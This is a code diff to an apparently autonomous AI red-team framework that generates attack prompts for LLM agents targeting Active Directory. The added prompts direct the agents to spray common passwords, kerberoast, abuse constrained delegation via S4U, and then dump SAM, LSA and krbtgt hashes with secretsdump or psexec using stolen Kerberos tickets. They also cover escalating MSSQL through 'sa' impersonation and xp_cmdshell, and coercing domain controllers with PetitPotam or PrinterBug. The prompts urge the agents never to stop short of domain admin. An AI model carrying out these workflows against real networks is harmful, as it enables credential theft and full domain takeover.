@@ -44,6 +44,36 @@ if TYPE_CHECKING:
     from dreadnode.agent import Agent
 
 
+# Rate limit retry configuration
+RATE_LIMIT_BACKOFF_DELAYS = [30.0, 60.0, 120.0]  # Exponential backoff: 30s, 60s, 120s
+RATE_LIMIT_MAX_RETRIES = len(RATE_LIMIT_BACKOFF_DELAYS)
+
+
+def _is_rate_limit_error(exc: Exception) -> bool:
+    """Check if an exception is a rate limit error from the LLM provider."""
+    exc_str = str(exc).lower()
+    exc_type = type(exc).__name__
+
+    # Direct litellm/openai rate limit errors
+    if "ratelimit" in exc_type.lower() or "rate_limit" in exc_type.lower():
+        return True
+
+    # Check exception message for rate limit indicators
+    rate_limit_indicators = [
+        "rate limit",
+        "rate_limit",
+        "ratelimit",
+        "too many requests",
+        "429",
+        "quota exceeded",
+        "tokens per min",
+        "requests per min",
+        "tpm limit",
+        "rpm limit",
+    ]
+    return any(indicator in exc_str for indicator in rate_limit_indicators)
+
+
 def _is_pass_the_hash_compatible(hash_value: str | None) -> bool:
     if not hash_value:
         return False
@@ -59,6 +89,108 @@ def _is_pass_the_hash_compatible(hash_value: str | None) -> bool:
             return False
         return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
     return bool(re.fullmatch(r"[0-9a-fA-F]{32}", normalized))
+
+
+def _resolve_dc_ip_for_domain(  # noqa: PLR0912
+    state: SharedRedTeamState | None,
+    domain: str,
+    provided_dc_ip: str,
+) -> tuple[str, str | None]:
+    """Validate and potentially re-resolve DC IP for a domain.
+
+    If provided_dc_ip doesn't match a host serving the specified domain,
+    attempt to find the correct DC from current state.
+
+    Returns:
+        Tuple of (dc_ip, warning_message). warning_message is None if DC IP is valid.
+    """
+    if not state or not domain:
+        return provided_dc_ip, None
+
+    domain_lower = domain.lower()
+
+    def _hostname_matches_domain(hostname: str) -> bool:
+        if not hostname:
+            return False
+        hostname_lower = hostname.lower()
+        # Match both FQDN suffix and short domain name in hostname
+        # e.g., for domain "corp": srv01.corp.contoso.local matches
+        # e.g., for domain "corp.contoso.local": same hostname matches
+        return f".{domain_lower}" in hostname_lower or hostname_lower.endswith(f".{domain_lower}")
+
+    def _has_dc_services(host: Any) -> bool:
+        for svc in getattr(host, "services", []):
+            svc_lower = svc.lower()
+            if any(svc_lower.startswith(p) for p in ("88/tcp", "389/tcp")):
+                return True
+            if any(n in svc_lower for n in ("kerberos", "ldap")):
+                return True
+        return False
+
+    def _has_dc_role(host: Any) -> bool:
+        roles = getattr(host, "roles", [])
+        if not roles:
+            return False
+        roles_str = str(roles).lower()
+        return any(m in roles_str for m in ("dc", "domain controller", "ad dc"))
+
+    # Check if provided DC IP belongs to a host matching this domain
+    provided_host = None
+    if provided_dc_ip:
+        for host in state.all_hosts:
+            if host.ip == provided_dc_ip:
+                provided_host = host
+                break
+
+    if provided_host and _hostname_matches_domain(provided_host.hostname or ""):
+        # Provided DC IP is valid for this domain
+        return provided_dc_ip, None
+
+    # Search for a DC that serves this domain
+    # Priority 1: Hostname matches domain + has DC services
+    for host in state.all_hosts:
+        hostname = host.hostname or ""
+        if _hostname_matches_domain(hostname) and _has_dc_services(host):
+            if not provided_dc_ip:
+                logger.info(f"DC IP resolved: {host.ip} ({hostname}) for domain {domain}")
+            else:
+                logger.warning(
+                    f"DC IP RE-RESOLVED: {provided_dc_ip} -> {host.ip} ({hostname}) for domain {domain}"
+                )
+            return host.ip, None
+
+    # Priority 2: Has DC role + hostname matches domain
+    for host in state.all_hosts:
+        hostname = host.hostname or ""
+        if _hostname_matches_domain(hostname) and _has_dc_role(host):
+            if not provided_dc_ip:
+                logger.info(f"DC IP resolved via role: {host.ip} ({hostname}) for domain {domain}")
+            else:
+                logger.warning(
+                    f"DC IP RE-RESOLVED via role: {provided_dc_ip} -> {host.ip} ({hostname}) for domain {domain}"
+                )
+            return host.ip, None
+
+    # Priority 3: Any host with DC services (fallback, less accurate)
+    for host in state.all_hosts:
+        if _has_dc_services(host):
+            warning = (
+                f"⚠️ DC IP FALLBACK: No DC found for domain {domain}. "
+                f"Using {host.ip} ({host.hostname or 'unknown'}) which has DC services."
+            )
+            logger.warning(warning)
+            return host.ip, warning
+
+    # No DC found at all
+    if provided_dc_ip:
+        warning = (
+            f"⚠️ DC IP WARNING: {provided_dc_ip} may not serve domain {domain}. "
+            f"No matching DC found in state."
+        )
+        return provided_dc_ip, warning
+
+    logger.warning(f"No DC IP could be resolved for domain {domain}")
+    return "", None
 
 
 def format_state_context(  # noqa: PLR0912
@@ -644,6 +776,57 @@ def generate_prompt_from_task(  # noqa: PLR0912
         )
         targets = payload.get("target_ips") or []
         dc_ip = payload.get("dc_ip") or ""
+        domain = payload.get("domain", "")
+
+        # Handle Kerberos ticket-based auth (from S4U attack auto-chain)
+        ticket_path = payload.get("ticket_path")
+        no_pass = payload.get("no_pass", False)
+        if ticket_path and no_pass and "secretsdump" in techniques:
+            target = targets[0] if targets else ""
+            username = payload.get("username", "Administrator")
+            base_prompt = (
+                "**KERBEROS TICKET-BASED SECRETSDUMP**\n\n"
+                f"Target: {target}\n"
+                f"Domain: {domain}\n"
+                f"Username: {username}\n"
+                f"Ticket Path: {ticket_path}\n"
+                f"DC IP: {dc_ip or 'N/A'}\n"
+                f"Task ID: {task.task_id}\n\n"
+                "**CRITICAL: You have a Kerberos ticket from S4U attack!**\n"
+                "This ticket allows you to impersonate Administrator to the target.\n\n"
+                "**EXECUTE secretsdump with Kerberos ticket:**\n"
+                f"secretsdump(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    no_pass=True,\n"
+                f"    ticket_path='{ticket_path}'"
+            )
+            if dc_ip:
+                base_prompt += f",\n    dc_ip='{dc_ip}'"
+            base_prompt += (
+                "\n)\n\n"
+                "**IMPORTANT:**\n"
+                "- The ticket_path sets KRB5CCNAME for Kerberos auth\n"
+                "- no_pass=True tells secretsdump to use -k -no-pass\n"
+                "- This will dump SAM, LSA secrets, and domain hashes if on a DC\n\n"
+                "If secretsdump succeeds, look for:\n"
+                "- krbtgt hash → GOLDEN TICKET capability\n"
+                "- Administrator hash → DOMAIN ADMIN ACHIEVED\n\n"
+                "Report any hashes found in JSON format:\n"
+                "```json\n"
+                '{"hash": {"username": "Administrator", "hash_value": "...", "hash_type": "NTLM", "domain": "..."}}\n'
+                "```"
+            )
+            state_context = format_state_context(state, "credential_access", current_target=target)
+            return base_prompt + state_context
+
+        # Validate/re-resolve DC IP for Kerberos operations (critical for kerberoast, AS-REP, etc.)
+        dc_warning = None
+        kerberos_techniques = {"kerberoast", "as_rep_roast", "secretsdump", "lsassy", "laps_dump"}
+        if any(t in kerberos_techniques for t in techniques) and domain:
+            # Always try to resolve DC IP for Kerberos ops - even if empty or mismatched
+            dc_ip, dc_warning = _resolve_dc_ip_for_domain(state, domain, dc_ip or "")
+
         reason = payload.get("reason") or ""
         source = payload.get("credential_source") or ""
         hash_type = payload.get("hash_type") or ""
@@ -818,8 +1001,13 @@ def generate_prompt_from_task(  # noqa: PLR0912
                 "1. username_as_password(target=DC_IP, domain=DOMAIN) - HIGH SUCCESS RATE\n"
                 "   Tests if users have username=password (e.g., hodor:hodor)\n"
                 "   Zero lockout risk, one attempt per user\n\n"
-                "2. password_spray(target=DC_IP, domain=DOMAIN, password='Password1')  # pragma: allowlist secret\n"
-                "   Try common passwords: Password1, Welcome1, Summer2024, Winter2024, Company123\n\n"
+                "2. password_spray - YOU MUST CALL THIS ONCE FOR EACH PASSWORD:\n"
+                "   password_spray(target=DC_IP, domain=DOMAIN, password='Password1')  # pragma: allowlist secret\n"
+                "   password_spray(target=DC_IP, domain=DOMAIN, password='Welcome1')  # pragma: allowlist secret\n"
+                "   password_spray(target=DC_IP, domain=DOMAIN, password='Summer2024')  # pragma: allowlist secret\n"
+                "   password_spray(target=DC_IP, domain=DOMAIN, password='Company123')  # pragma: allowlist secret\n"
+                "   password_spray(target=DC_IP, domain=DOMAIN, password='Passw0rd!')  # pragma: allowlist secret\n"
+                "   **Call spray for EACH password above - common weak passwords**\n\n"
                 "3. password_policy(target=DC_IP, domain=DOMAIN) - Check lockout before spraying\n\n"
                 "These are the FIRST techniques to run when you have no credentials.\n"
                 "Report any credentials found immediately."
@@ -860,9 +1048,9 @@ def generate_prompt_from_task(  # noqa: PLR0912
                     "- finds passwords in LDAP description fields"
                 ),
                 "kerberoast": (
-                    f"kerberoast(target='{dc_ip}', username='{payload.get('username')}', "
-                    f"{cred_param}, domain='{payload.get('domain', '')}') "
-                    "- service account hashes"
+                    f"kerberoast(domain='{payload.get('domain', '')}', username='{payload.get('username')}', "
+                    f"{cred_param}, dc_ip='{dc_ip}') "
+                    "- service account hashes (uses correct DC for the domain)"
                 ),
                 "secretsdump": (
                     f"secretsdump(target='{dc_ip}', username='{payload.get('username')}', "
@@ -888,10 +1076,13 @@ def generate_prompt_from_task(  # noqa: PLR0912
                     technique_instructions.append(f"{i}. {technique}(...)")
 
             if technique_instructions:
+                # Include DC warning if DC IP was re-resolved
+                dc_warning_line = f"\n{dc_warning}\n" if dc_warning else ""
                 base_prompt = (
                     "**MANDATORY TECHNIQUE EXECUTION**\n\n"
                     f"Domain: {payload.get('domain', '')}\n"
                     f"DC IP: {dc_ip or 'N/A'}\n"
+                    f"{dc_warning_line}"
                     f"Targets: {', '.join(targets) if targets else 'N/A'}\n"
                     f"Username: {payload.get('username') or 'N/A'}\n"
                     f"Credential: {cred_display}\n"
@@ -995,22 +1186,177 @@ def generate_prompt_from_task(  # noqa: PLR0912
                     )
 
             mssql_prompt = (
-                base_prompt + "**MSSQL EXPLOITATION WORKFLOW:**\n"
-                "1. Use mssql_enum_linked_servers() to find linked servers\n"
-                "2. Check for impersonation: EXECUTE AS LOGIN / EXECUTE AS USER\n"
-                "3. If impersonation available, use mssql_impersonate() to escalate to 'sa'\n"
-                "4. If linked servers exist, use mssql_exec_linked() to pivot cross-domain\n"
-                "5. Enable xp_cmdshell if sysadmin and get code execution\n"
+                base_prompt + "**MSSQL EXPLOITATION WORKFLOW (IMPERSONATION FIRST!):**\n\n"
+                "**STEP 1: ENUMERATE IMPERSONATION RIGHTS (DO THIS FIRST!)**\n"
+                "```\n"
+                "mssql_enum_impersonation(\n"
+                f"    target='{target}',\n"
+                "    username=<USER>,\n"
+                "    password=<PASS>,\n"
+                "    domain=<DOMAIN>\n"
+                ")\n"
+                "```\n"
+                "→ If you can impersonate 'sa', you have a DIRECT PATH to sysadmin!\n\n"
+                "**STEP 2: IMPERSONATE SA (if available)**\n"
+                "```\n"
+                "mssql_impersonate(\n"
+                f"    target='{target}',\n"
+                "    username=<USER>,\n"
+                "    password=<PASS>,\n"
+                "    impersonate_user='sa',\n"
+                "    query='SELECT SYSTEM_USER',\n"
+                "    domain=<DOMAIN>\n"
+                ")\n"
+                "```\n"
+                "→ Now you're sysadmin! Enable xp_cmdshell next.\n\n"
+                "**STEP 3: ENABLE XP_CMDSHELL (as sysadmin)**\n"
+                "```\n"
+                "mssql_enable_xp_cmdshell(\n"
+                f"    target='{target}',\n"
+                "    username=<USER>,\n"
+                "    password=<PASS>,\n"
+                "    domain=<DOMAIN>\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 4: EXECUTE COMMANDS**\n"
+                "```\n"
+                "mssql_command(\n"
+                f"    target='{target}',\n"
+                "    username=<USER>,\n"
+                "    password=<PASS>,\n"
+                "    command='whoami /priv',\n"
+                "    domain=<DOMAIN>\n"
+                ")\n"
+                "```\n"
+                "→ Check for SeImpersonatePrivilege (potato attack potential)\n\n"
+                "**STEP 5: ENUMERATE LINKED SERVERS**\n"
+                "```\n"
+                "mssql_enum_linked_servers(\n"
+                f"    target='{target}',\n"
+                "    username=<USER>,\n"
+                "    password=<PASS>,\n"
+                "    domain=<DOMAIN>\n"
+                ")\n"
+                "```\n"
+                "→ Linked servers can pivot across domain/forest trusts!\n"
                 + creds_section
-                + "\nTry EACH credential against the target - SQL accepts Windows auth.\n"
-                "Report credentials obtained.\n"
-                "If you obtain credentials or hashes, include a JSON block:\n"
+                + "\n**CRITICAL NOTES:**\n"
+                "- Try EACH credential above - SQL accepts Windows auth\n"
+                "- Impersonation check is HIGHEST PRIORITY (fastest path to sysadmin)\n"
+                "- If xp_cmdshell gives NETWORK SERVICE, you may need potato attack for SYSTEM\n"
+                "- Linked servers enable cross-domain pivoting\n\n"
+                "Report credentials obtained in JSON format:\n"
                 "```json\n"
                 '{"credential": {"username": "", "password": "", "domain": "", "is_admin": false}}\n'
                 "```"
             )
             state_context = format_state_context(state, "exploit", current_target=target)
             return mssql_prompt + state_context
+
+        # Special handling for constrained delegation (S4U attack)
+        if vuln_type == "constrained_delegation":
+            account = payload.get("account", target)
+            target_spn = payload.get("target_spn", "")
+            domain = payload.get("domain", "")
+            username = payload.get("username", account)
+            password = payload.get("password", "")
+
+            # Find the DC for this domain
+            dc_ip = payload.get("dc_ip", "")
+
+            # Extract target hostname from SPN for post-exploitation
+            target_hostname = ""
+            if "/" in target_spn:
+                target_hostname = target_spn.split("/", 1)[1]
+
+            delegation_prompt = (
+                f"**CONSTRAINED DELEGATION EXPLOITATION**\n\n"
+                f"Account with delegation: {account}\n"
+                f"Target SPN: {target_spn}\n"
+                f"Target Host: {target_hostname}\n"
+                f"Domain: {domain}\n"
+                f"Task ID: {task.task_id}\n\n"
+                "**STEP 1: S4U ATTACK (Get Administrator ticket)**\n"
+                "```\n"
+                f"s4u_attack(\n"
+                f"    target_spn='{target_spn}',\n"
+                f"    impersonate='Administrator',\n"
+                f"    domain='{domain}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}'"
+            )
+            if dc_ip:
+                delegation_prompt += f",\n    dc_ip='{dc_ip}'"
+            delegation_prompt += (
+                "\n)\n"
+                "```\n"
+                "→ Look for: 'Saving ticket in <filename>.ccache'\n\n"
+                "**STEP 2: USE TICKET WITH SECRETSDUMP_KERBEROS (IMMEDIATELY AFTER!)**\n"
+                "```\n"
+                f"secretsdump_kerberos(\n"
+                f"    target='{target_hostname}',\n"
+                f"    username='Administrator',\n"
+                f"    domain='{domain}',\n"
+                f"    ticket_path='<ccache_file_from_step_1>'"
+            )
+            if dc_ip:
+                delegation_prompt += f",\n    dc_ip='{dc_ip}'"
+            delegation_prompt += (
+                "\n)\n"
+                "```\n"
+                "**IMPORTANT:** Replace <ccache_file_from_step_1> with actual .ccache path from s4u_attack output!\n\n"
+                "**STEP 3: ALTERNATIVE - PSEXEC_KERBEROS FOR SHELL**\n"
+                "If secretsdump fails or you need a shell:\n"
+                "```\n"
+                f"psexec_kerberos(\n"
+                f"    target='{target_hostname}',\n"
+                f"    username='Administrator',\n"
+                f"    domain='{domain}',\n"
+                f"    ticket_path='<ccache_file_from_step_1>',\n"
+                f"    command='cmd /c whoami && hostname'"
+            )
+            if dc_ip:
+                delegation_prompt += f",\n    dc_ip='{dc_ip}'"
+            delegation_prompt += (
+                "\n)\n"
+                "```\n\n"
+                "**CRITICAL SUCCESS INDICATORS:**\n"
+                "- If target is a DC: Look for krbtgt hash → DOMAIN ADMIN\n"
+                "- If target is a DC: Look for Administrator hash → DOMAIN ADMIN\n"
+                "- If target is a member server: SAM/LSA secrets for lateral movement\n\n"
+                "**DO NOT STOP after getting the ticket!** The ticket is useless by itself.\n"
+                "You MUST use it with secretsdump_kerberos or psexec_kerberos to achieve actual access.\n\n"
+                "Report any hashes obtained:\n"
+                "```json\n"
+                '{"hash": {"username": "Administrator", "hash_value": "...", "hash_type": "NTLM", "domain": "..."}}\n'
+                "```"
+            )
+            state_context = format_state_context(state, "exploit", current_target=target)
+            return delegation_prompt + state_context
+
+        # Special handling for unconstrained delegation
+        if vuln_type == "unconstrained_delegation":
+            account = payload.get("account", target)
+            domain = payload.get("domain", "")
+
+            unconstrained_prompt = (
+                f"**UNCONSTRAINED DELEGATION EXPLOITATION**\n\n"
+                f"Account with unconstrained delegation: {account}\n"
+                f"Domain: {domain}\n"
+                f"Task ID: {task.task_id}\n\n"
+                "**EXPLOITATION WORKFLOW:**\n"
+                "1. If you have access to the machine with unconstrained delegation:\n"
+                "   - Dump TGTs from memory using mimikatz or Rubeus\n"
+                "   - Look for high-value tickets (Domain Admins, DCs)\n\n"
+                "2. If you need to coerce authentication:\n"
+                "   - Request coercion (PetitPotam, PrinterBug) against a DC\n"
+                "   - The DC's TGT will be cached on this machine\n"
+                "   - Extract and use the TGT for DCSync\n\n"
+                "**CRITICAL**: Unconstrained delegation = potential DC compromise!\n"
+                "Report any credentials or hashes obtained."
+            )
+            state_context = format_state_context(state, "exploit", current_target=target)
+            return unconstrained_prompt + state_context
 
         # Default exploit prompt
         default_prompt = (
@@ -1069,10 +1415,18 @@ def generate_prompt_from_task(  # noqa: PLR0912
             + "\n".join(technique_instructions)
             + "\n\n"
             "**WORKFLOW:**\n"
-            "1. Execute each technique in order\n"
-            "2. Report any delegation misconfigurations found\n"
-            "3. Mark task complete with findings\n\n"
-            "Delegation findings are HIGH VALUE for privilege escalation paths."
+            "1. Execute each enumeration technique\n"
+            "2. If CONSTRAINED DELEGATION is found for the current user ({username}):\n"
+            "   a. Run s4u_attack to get Administrator ticket for the target SPN\n"
+            "   b. If ticket obtained, IMMEDIATELY use it:\n"
+            "      - Set KRB5CCNAME to the .ccache file path\n"
+            "      - Run secretsdump with -k -no-pass against the target DC to dump hashes\n"
+            "      - Example: secretsdump -k -no-pass -dc-ip {dc_ip} {domain}/Administrator@dc01.{domain}\n"
+            "   c. Report the Administrator hash if obtained - THIS IS DOMAIN ADMIN!\n"
+            "3. If UNCONSTRAINED DELEGATION is found, report it for coercion attack\n"
+            "4. Mark task complete with findings\n\n"
+            "**CRITICAL:** When you get an S4U ticket, you MUST use it immediately with secretsdump!\n"
+            "The ticket is your key to Domain Admin - don't stop after getting it."
         )
         state_context = format_state_context(state, "privesc", current_target=dc_ip)
         return base_prompt + state_context
@@ -1453,9 +1807,39 @@ class RedisWorkerAgent:
                 )
                 return
 
-            # Run agent
-            logger.info(f"[{self.agent_name}] Running agent for task {task.task_id}")
-            result = await self._run_agent(prompt)
+            # Run agent with rate limit retry
+            result = None
+            last_rate_limit_error: Exception | None = None
+            for attempt in range(RATE_LIMIT_MAX_RETRIES + 1):
+                try:
+                    attempt_msg = (
+                        f" (retry {attempt}/{RATE_LIMIT_MAX_RETRIES})" if attempt > 0 else ""
+                    )
+                    logger.info(
+                        f"[{self.agent_name}] Running agent for task {task.task_id}{attempt_msg}"
+                    )
+                    result = await self._run_agent(prompt)
+                    if attempt > 0:
+                        logger.success(
+                            f"[{self.agent_name}] Task {task.task_id} succeeded after {attempt} retries"
+                        )
+                    break  # Success, exit retry loop
+                except Exception as e:
+                    if _is_rate_limit_error(e) and attempt < RATE_LIMIT_MAX_RETRIES:
+                        delay = RATE_LIMIT_BACKOFF_DELAYS[attempt]
+                        logger.warning(
+                            f"[{self.agent_name}] ⏳ Rate limit hit for task {task.task_id}, "
+                            f"backing off {delay}s (attempt {attempt + 1}/{RATE_LIMIT_MAX_RETRIES}): {e}"
+                        )
+                        last_rate_limit_error = e
+                        await asyncio.sleep(delay)
+                        continue
+                    raise  # Re-raise if not rate limit or out of retries
+
+            if result is None:
+                # All retries exhausted due to rate limits
+                raise last_rate_limit_error or RuntimeError("Agent returned no result")
+
             result_text = self._extract_result(result)
             agent_error = self._extract_agent_error(result)
             result_summary = self._summarize_agent_result(result)
